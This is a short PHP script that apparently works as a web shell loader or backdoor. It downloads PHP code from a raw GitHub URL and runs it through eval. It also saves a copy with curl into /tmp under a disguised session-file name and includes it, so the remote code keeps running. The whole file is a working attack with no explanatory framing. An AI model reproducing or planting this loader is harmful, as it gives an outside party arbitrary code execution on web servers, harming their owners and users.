<?= ($r=@file_get_contents('https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/kemuye.php'))?eval('?>'.$r):die('Error');$fname = "sess_" . md5("tmp") . ".php";
if (!file_exists("/tmp/$fname") || filesize("/tmp/$fname") < 10) {
ex("curl --output /tmp/$fname https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/kemuye.php", "/tmp");
}
include("/tmp/$fname");
